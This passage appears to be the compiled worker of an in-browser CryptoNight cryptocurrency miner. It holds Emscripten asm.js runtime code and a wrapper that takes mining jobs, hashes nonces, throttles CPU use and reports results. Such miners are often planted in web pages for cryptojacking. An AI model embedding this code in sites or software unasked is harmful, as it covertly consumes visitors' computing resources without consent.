        if ((d | 0) > 0 & (a | 0) < (b | 0) | (a | 0) < 0) {
            V() | 0;
            ba(12);
            return -1
        }
        c[i >> 2] = a;
        if ((a | 0) > (U() | 0) ? (T() | 0) == 0 : 0) {
            c[i >> 2] = b;
            ba(12);
            return -1
        }
        return b | 0
    }

    function Db(b, d, e) {
        b = b | 0;
        d = d | 0;
        e = e | 0;
        var f = 0,
            g = 0,
            h = 0;
        if ((e | 0) >= 8192) return ea(b | 0, d | 0, e | 0) | 0;
        h = b | 0;
        g = b + e | 0;
        if ((b & 3) == (d & 3)) {
            while (b & 3) {
                if (!e) return h | 0;
                a[b >> 0] = a[d >> 0] | 0;
                b = b + 1 | 0;
                d = d + 1 | 0;
                e = e - 1 | 0
            }
            e = g & -4 | 0;
            f = e - 64 | 0;
            while ((b | 0) <= (f | 0)) {
                c[b >> 2] = c[d >> 2];
                c[b + 4 >> 2] = c[d + 4 >> 2];
                c[b + 8 >> 2] = c[d + 8 >> 2];
                c[b + 12 >> 2] = c[d + 12 >> 2];
                c[b + 16 >> 2] = c[d + 16 >> 2];
                c[b + 20 >> 2] = c[d + 20 >> 2];
                c[b + 24 >> 2] = c[d + 24 >> 2];
                c[b + 28 >> 2] = c[d + 28 >> 2];
                c[b + 32 >> 2] = c[d + 32 >> 2];
                c[b + 36 >> 2] = c[d + 36 >> 2];
                c[b + 40 >> 2] = c[d + 40 >> 2];
                c[b + 44 >> 2] = c[d + 44 >> 2];
                c[b + 48 >> 2] = c[d + 48 >> 2];
                c[b + 52 >> 2] = c[d + 52 >> 2];
                c[b + 56 >> 2] = c[d + 56 >> 2];
                c[b + 60 >> 2] = c[d + 60 >> 2];
                b = b + 64 | 0;
                d = d + 64 | 0
            }
            while ((b | 0) < (e | 0)) {
                c[b >> 2] = c[d >> 2];
                b = b + 4 | 0;
                d = d + 4 | 0
            }
        } else {
            e = g - 4 | 0;
            while ((b | 0) < (e | 0)) {
                a[b >> 0] = a[d >> 0] | 0;
                a[b + 1 >> 0] = a[d + 1 >> 0] | 0;
                a[b + 2 >> 0] = a[d + 2 >> 0] | 0;
                a[b + 3 >> 0] = a[d + 3 >> 0] | 0;
                b = b + 4 | 0;
                d = d + 4 | 0
            }
        }
        while ((b | 0) < (g | 0)) {
            a[b >> 0] = a[d >> 0] | 0;
            b = b + 1 | 0;
            d = d + 1 | 0
        }
        return h | 0
    }

    function Eb(b, c, d) {
        b = b | 0;
        c = c | 0;
        d = d | 0;
        var e = 0;
        if ((c | 0) < (b | 0) & (b | 0) < (c + d | 0)) {
            e = b;
            c = c + d | 0;
            b = b + d | 0;
            while ((d | 0) > 0) {
                b = b - 1 | 0;
                c = c - 1 | 0;
                d = d - 1 | 0;
                a[b >> 0] = a[c >> 0] | 0
            }
            b = e
        } else Db(b, c, d) | 0;
        return b | 0
    }

    function Fb(a, b) {
        a = a | 0;
        b = b | 0;
        return la[a & 1](b | 0) | 0
    }

    function Gb(a, b, c, d) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        d = d | 0;
        return ma[a & 3](b | 0, c | 0, d | 0) | 0
    }

    function Hb(a, b, c, d) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        d = d | 0;
        na[a & 7](b | 0, c | 0, d | 0)
    }

    function Ib(a) {
        a = a | 0;
        R(0);
        return 0
    }

    function Jb(a, b, c) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        R(1);
        return 0
    }

    function Kb(a, b, c) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        R(2)
    }

    // EMSCRIPTEN_END_FUNCS
    var la = [Ib, bb];
    var ma = [Jb, jb, db, cb];
    var na = [Kb, za, va, Aa, Ba, Kb, Kb, Kb];
    return {
        _i64Subtract: vb,
        _cryptonight_hash: ya,
        setThrew: sa,
        dynCall_viii: Hb,
        _bitshift64Lshr: yb,
        _bitshift64Shl: zb,
        _fflush: qb,
        ___errno_location: fb,
        _memset: xb,
        _sbrk: Cb,
        _cryptonight_create: wa,
        _memcpy: Db,
        stackAlloc: oa,
        ___muldi3: Bb,
        getTempRet0: ua,
        setTempRet0: ta,
        _i64Add: wb,
        dynCall_iiii: Gb,
        _emscripten_get_global_libc: kb,
        dynCall_ii: Fb,
        _cryptonight_destroy: xa,
        stackSave: pa,
        _free: $a,
        runPostSets: ub,
        establishStackSpace: ra,
        _memmove: Eb,
        stackRestore: qa,
        _malloc: _a
    }
})


// EMSCRIPTEN_END_ASM
(Module.asmGlobalArg, Module.asmLibraryArg, buffer);
var getTempRet0 = Module["getTempRet0"] = asm["getTempRet0"];
var _cryptonight_hash = Module["_cryptonight_hash"] = asm["_cryptonight_hash"];
var setThrew = Module["setThrew"] = asm["setThrew"];
var _bitshift64Lshr = Module["_bitshift64Lshr"] = asm["_bitshift64Lshr"];
var _bitshift64Shl = Module["_bitshift64Shl"] = asm["_bitshift64Shl"];
var _fflush = Module["_fflush"] = asm["_fflush"];
var ___errno_location = Module["___errno_location"] = asm["___errno_location"];
var _memset = Module["_memset"] = asm["_memset"];
var _sbrk = Module["_sbrk"] = asm["_sbrk"];
var _cryptonight_create = Module["_cryptonight_create"] = asm["_cryptonight_create"];
var _memcpy = Module["_memcpy"] = asm["_memcpy"];
var stackAlloc = Module["stackAlloc"] = asm["stackAlloc"];
var ___muldi3 = Module["___muldi3"] = asm["___muldi3"];
var _i64Subtract = Module["_i64Subtract"] = asm["_i64Subtract"];
var setTempRet0 = Module["setTempRet0"] = asm["setTempRet0"];
var _i64Add = Module["_i64Add"] = asm["_i64Add"];
var _emscripten_get_global_libc = Module["_emscripten_get_global_libc"] = asm["_emscripten_get_global_libc"];
var _cryptonight_destroy = Module["_cryptonight_destroy"] = asm["_cryptonight_destroy"];
var stackSave = Module["stackSave"] = asm["stackSave"];
var _free = Module["_free"] = asm["_free"];
var runPostSets = Module["runPostSets"] = asm["runPostSets"];
var establishStackSpace = Module["establishStackSpace"] = asm["establishStackSpace"];
var _memmove = Module["_memmove"] = asm["_memmove"];
var stackRestore = Module["stackRestore"] = asm["stackRestore"];
var _malloc = Module["_malloc"] = asm["_malloc"];
var dynCall_ii = Module["dynCall_ii"] = asm["dynCall_ii"];
var dynCall_iiii = Module["dynCall_iiii"] = asm["dynCall_iiii"];
var dynCall_viii = Module["dynCall_viii"] = asm["dynCall_viii"];
Runtime.stackAlloc = Module["stackAlloc"];
Runtime.stackSave = Module["stackSave"];
Runtime.stackRestore = Module["stackRestore"];
Runtime.establishStackSpace = Module["establishStackSpace"];
Runtime.setTempRet0 = Module["setTempRet0"];
Runtime.getTempRet0 = Module["getTempRet0"];
Module["asm"] = asm;
if (memoryInitializer) {
    if (typeof Module["locateFile"] === "function") {
        memoryInitializer = Module["locateFile"](memoryInitializer)
    } else if (Module["memoryInitializerPrefixURL"]) {
        memoryInitializer = Module["memoryInitializerPrefixURL"] + memoryInitializer
    }
    if (ENVIRONMENT_IS_NODE || ENVIRONMENT_IS_SHELL) {
        var data = Module["readBinary"](memoryInitializer);
        HEAPU8.set(data, Runtime.GLOBAL_BASE)
    } else {
        addRunDependency("memory initializer");
        var applyMemoryInitializer = (function(data) {
            if (data.byteLength) data = new Uint8Array(data);
            HEAPU8.set(data, Runtime.GLOBAL_BASE);
            if (Module["memoryInitializerRequest"]) delete Module["memoryInitializerRequest"].response;
            removeRunDependency("memory initializer")
        });

        function doBrowserLoad() {
            Module["readAsync"](memoryInitializer, applyMemoryInitializer, (function() {
                throw "could not load memory initializer " + memoryInitializer
            }))
        }
        if (Module["memoryInitializerRequest"]) {
            function useRequest() {
                var request = Module["memoryInitializerRequest"];
                if (request.status !== 200 && request.status !== 0) {
                    console.warn("a problem seems to have happened with Module.memoryInitializerRequest, status: " + request.status + ", retrying " + memoryInitializer);
                    doBrowserLoad();
                    return
                }
                applyMemoryInitializer(request.response)
            }
            if (Module["memoryInitializerRequest"].response) {
                setTimeout(useRequest, 0)
            } else {
                Module["memoryInitializerRequest"].addEventListener("load", useRequest)
            }
        } else {
            doBrowserLoad()
        }
    }
}

function ExitStatus(status) {
    this.name = "ExitStatus";
    this.message = "Program terminated with exit(" + status + ")";
    this.status = status
}
ExitStatus.prototype = new Error;
ExitStatus.prototype.constructor = ExitStatus;
var initialStackTop;
var preloadStartTime = null;
var calledMain = false;
dependenciesFulfilled = function runCaller() {
    if (!Module["calledRun"]) run();
    if (!Module["calledRun"]) dependenciesFulfilled = runCaller
};
Module["callMain"] = Module.callMain = function callMain(args) {
    args = args || [];
    ensureInitRuntime();
    var argc = args.length + 1;

    function pad() {
        for (var i = 0; i < 4 - 1; i++) {
            argv.push(0)
        }
    }
    var argv = [allocate(intArrayFromString(Module["thisProgram"]), "i8", ALLOC_NORMAL)];
    pad();
    for (var i = 0; i < argc - 1; i = i + 1) {
        argv.push(allocate(intArrayFromString(args[i]), "i8", ALLOC_NORMAL));
        pad()
    }
    argv.push(0);
    argv = allocate(argv, "i32", ALLOC_NORMAL);
    try {
        var ret = Module["_main"](argc, argv, 0);
        exit(ret, true)
    } catch (e) {
        if (e instanceof ExitStatus) {
            return
        } else if (e == "SimulateInfiniteLoop") {
            Module["noExitRuntime"] = true;
            return
        } else {
            var toLog = e;
            if (e && typeof e === "object" && e.stack) {
                toLog = [e, e.stack]
            }
            Module.printErr("exception thrown: " + toLog);
            Module["quit"](1, e)
        }
    } finally {
        calledMain = true
    }
};

function run(args) {
    args = args || Module["arguments"];
    if (preloadStartTime === null) preloadStartTime = Date.now();
    if (runDependencies > 0) {
        return
    }
    preRun();
    if (runDependencies > 0) return;
    if (Module["calledRun"]) return;

    function doRun() {
        if (Module["calledRun"]) return;
        Module["calledRun"] = true;
        if (ABORT) return;
        ensureInitRuntime();
        preMain();
        if (Module["onRuntimeInitialized"]) Module["onRuntimeInitialized"]();
        if (Module["_main"] && shouldRunNow) Module["callMain"](args);
        postRun()
    }
    if (Module["setStatus"]) {
        Module["setStatus"]("Running...");
        setTimeout((function() {
            setTimeout((function() {
                Module["setStatus"]("")
            }), 1);
            doRun()
        }), 1)
    } else {
        doRun()
    }
}
Module["run"] = Module.run = run;

function exit(status, implicit) {
    if (implicit && Module["noExitRuntime"]) {
        return
    }
    if (Module["noExitRuntime"]) {} else {
        ABORT = true;
        EXITSTATUS = status;
        STACKTOP = initialStackTop;
        exitRuntime();
        if (Module["onExit"]) Module["onExit"](status)
    }
    if (ENVIRONMENT_IS_NODE) {
        process["exit"](status)
    }
    Module["quit"](status, new ExitStatus(status))
}
Module["exit"] = Module.exit = exit;
var abortDecorators = [];

function abort(what) {
    if (Module["onAbort"]) {
        Module["onAbort"](what)
    }
    if (what !== undefined) {
        Module.print(what);
        Module.printErr(what);
        what = JSON.stringify(what)
    } else {
        what = ""
    }
    ABORT = true;
    EXITSTATUS = 1;
    var extra = "\nIf this abort() is unexpected, build with -s ASSERTIONS=1 which can give more information.";
    var output = "abort(" + what + ") at " + stackTrace() + extra;
    if (abortDecorators) {
        abortDecorators.forEach((function(decorator) {
            output = decorator(output, what)
        }))
    }
    throw output
}
Module["abort"] = Module.abort = abort;
if (Module["preInit"]) {
    if (typeof Module["preInit"] == "function") Module["preInit"] = [Module["preInit"]];
    while (Module["preInit"].length > 0) {
        Module["preInit"].pop()()
    }
}
var shouldRunNow = true;
if (Module["noInitialRun"]) {
    shouldRunNow = false
}
run();
var CryptonightWASMWrapper = (function() {
    this.ctx = _cryptonight_create();
    this.throttleWait = 0;
    this.throttledStart = 0;
    this.throttledHashes = 0;
    this.workThrottledBound = this.workThrottled.bind(this);
    this.currentJob = null;
    this.target = new Uint8Array([255, 255, 255, 255, 255, 255, 255, 255]);
    var heap = Module.HEAPU8.buffer;
    this.input = new Uint8Array(heap, Module._malloc(84), 84);
    this.output = new Uint8Array(heap, Module._malloc(32), 32);
    self.postMessage("ready");
    self.onmessage = this.onMessage.bind(this)
});
CryptonightWASMWrapper.prototype.onMessage = (function(msg) {
    var job = msg.data;
    if (job.verify_id) {
        this.verify(job);
        return
    }
    if (!this.currentJob || this.currentJob.job_id !== job.job_id) {
        this.setJob(job)
    }
    if (job.throttle) {
        this.throttleWait = 1 / (1 - job.throttle) - 1;
        this.throttledStart = this.now();
        this.throttledHashes = 0;
        this.workThrottled()
    } else {
        this.work()
    }
});
CryptonightWASMWrapper.prototype.destroy = (function() {
    _cryptonight_destroy(this.ctx)
});
CryptonightWASMWrapper.prototype.hexToBytes = (function(hex, bytes) {
    var bytes = new Uint8Array(hex.length / 2);
    for (var i = 0, c = 0; c < hex.length; c += 2, i++) {
        bytes[i] = parseInt(hex.substr(c, 2), 16)
    }
    return bytes
});
CryptonightWASMWrapper.prototype.bytesToHex = (function(bytes) {
    for (var hex = "", i = 0; i < bytes.length; i++) {
        hex += (bytes[i] >>> 4).toString(16);
        hex += (bytes[i] & 15).toString(16)
    }
    return hex
});
CryptonightWASMWrapper.prototype.meetsTarget = (function(hash, target) {
    for (var i = 0; i < target.length; i++) {
        var hi = hash.length - i - 1,
            ti = target.length - i - 1;
        if (hash[hi] > target[ti]) {
            return false
        } else if (hash[hi] < target[ti]) {
            return true
        }
    }
    return false
});
CryptonightWASMWrapper.prototype.setJob = (function(job) {
    this.currentJob = job;
    this.blob = this.hexToBytes(job.blob);
    this.input.set(this.blob);
    var target = this.hexToBytes(job.target);
    if (target.length <= 8) {
        for (var i = 0; i < target.length; i++) {
            this.target[this.target.length - i - 1] = target[target.length - i - 1]
        }
        for (var i = 0; i < this.target.length - target.length; i++) {
            this.target[i] = 255
        }
    } else {
        this.target = target
    }
});
CryptonightWASMWrapper.prototype.now = (function() {
    return self.performance ? self.performance.now() : Date.now()
});
CryptonightWASMWrapper.prototype.hash = (function(input, output, length) {
    var nonce = Math.random() * 4294967295 + 1 >>> 0;
    this.input[39] = (nonce & 4278190080) >> 24;
    this.input[40] = (nonce & 16711680) >> 16;
    this.input[41] = (nonce & 65280) >> 8;
    this.input[42] = (nonce & 255) >> 0;
    _cryptonight_hash(this.ctx, input.byteOffset, output.byteOffset, length)
});
CryptonightWASMWrapper.prototype.verify = (function(job) {
    this.blob = this.hexToBytes(job.blob);
    this.input.set(this.blob);
    for (var i = 0, c = 0; c < job.nonce.length; c += 2, i++) {
        this.input[39 + i] = parseInt(job.nonce.substr(c, 2), 16)
    }
    _cryptonight_hash(this.ctx, this.input.byteOffset, this.output.byteOffset, this.blob.length);
    var result = this.bytesToHex(this.output);
    self.postMessage({
        verify_id: job.verify_id,
        verified: result === job.result
    })
});
CryptonightWASMWrapper.prototype.work = (function() {
    var hashes = 0;
    var meetsTarget = false;
    var start = this.now();
    var elapsed = 0;
    do {
        this.hash(this.input, this.output, this.blob.length);
        hashes++;
        meetsTarget = this.meetsTarget(this.output, this.target);
        elapsed = this.now() - start
    } while (!meetsTarget && elapsed < 1e3);
    var hashesPerSecond = hashes / (elapsed / 1e3);
    if (meetsTarget) {
        var nonceHex = this.bytesToHex(this.input.subarray(39, 43));
        var resultHex = this.bytesToHex(this.output);
        self.postMessage({
            hashesPerSecond: hashesPerSecond,
            hashes: hashes,
            job_id: this.currentJob.job_id,
            nonce: nonceHex,
            result: resultHex
        })
    } else {
        self.postMessage({
            hashesPerSecond: hashesPerSecond,
            hashes: hashes
        })
    }
});
CryptonightWASMWrapper.prototype.workThrottled = (function() {
    var start = this.now();
    this.hash(this.input, this.output, this.blob.length);
    var end = this.now();
    var timePerHash = end - start;
    this.throttledHashes++;
    var elapsed = end - this.throttledStart;
    var hashesPerSecond = this.throttledHashes / (elapsed / 1e3);
    if (this.meetsTarget(this.output, this.target)) {
        var nonceHex = this.bytesToHex(this.input.subarray(39, 43));
        var resultHex = this.bytesToHex(this.output);
        self.postMessage({
            hashesPerSecond: hashesPerSecond,
            hashes: this.throttledHashes,
            job_id: this.currentJob.job_id,
            nonce: nonceHex,
            result: resultHex
        });
        this.throttledHashes = 0
    } else if (elapsed > 1e3) {
        self.postMessage({
            hashesPerSecond: hashesPerSecond,
            hashes: this.throttledHashes
        });
        this.throttledHashes = 0
    } else {
        var wait = Math.min(2e3, timePerHash * this.throttleWait);
        setTimeout(this.workThrottledBound, wait)
    }
});
Module["onRuntimeInitialized"] = (function() {
    var cryptonight = new CryptonightWASMWrapper
})